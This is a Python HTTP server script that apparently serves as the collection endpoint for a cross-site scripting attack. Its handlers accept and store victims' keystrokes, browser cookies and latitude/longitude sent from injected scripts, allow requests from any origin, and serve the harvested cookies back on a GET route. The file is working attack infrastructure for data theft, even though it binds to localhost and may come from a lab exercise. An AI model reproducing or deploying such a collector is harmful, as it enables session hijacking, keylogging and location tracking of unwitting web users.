#!/usr/bin/env python

from http.server import BaseHTTPRequestHandler, HTTPServer
import json
from XSSDatabase import EvilDatabase


# HTTPRequestHandler class
class testHTTPServer_RequestHandler(BaseHTTPRequestHandler):

    database = EvilDatabase()

    # Handle HTTP GET requests
    def do_GET(self):

        # Send response status code
        self.send_response(200)
        self.sendHeaders()

        route = self.path[1:]

        if route == "posts":
            self.getPosts()

        return

    # Handle HTTP POST requests
    def do_POST(self):

        # send headers
        self.send_response(200)
        self.sendHeaders()

        # Get the route and body
        route = self.path[1:]
        content_len = int(self.headers.get('content-length', 0))
        postBody = self.rfile.read(content_len).decode("utf-8")

        if route == "keystroke":
            self.handleKeystroke(postBody)
        elif route == "cookie":
            self.handleCookie(postBody)
        elif route == "location":
            self.handleLocation(postBody)

        return

    def sendHeaders(self):
        self.send_header('Content-type', 'text/html')
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header('Access-Control-Allow-Methods', 'GET, OPTIONS')
        self.send_header("Access-Control-Allow-Headers", "X-Requested-With")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()

    def getPosts(self):
        message = json.dumps(self.database.getCookies())

        # Write content as utf-8 data
        self.wfile.write(bytes(message, "utf8"))

    def handleKeystroke(self, postBody):
        keystroke = json.loads(postBody)['key']
        self.database.addKeystroke(keystroke)
        print("Received: " + keystroke)
        print(self.database.getKeystrokes())

    def handleCookie(self, cookie):
        self.database.addCookie(cookie)
        print("Cookie: " + cookie)

    def handleLocation(self, location):
        lat = json.loads(location)['lat']
        long = json.loads(location)['long']
        self.database.addLocation(lat, long)
        print("Lat: " + str(lat) + ", Long: " + str(long))


def run():
    print('starting server...')

    # Server settings
    server_address = ('127.0.0.1', 8082)
    httpd = HTTPServer(server_address, testHTTPServer_RequestHandler)
    print('running server...')
    httpd.serve_forever()

run()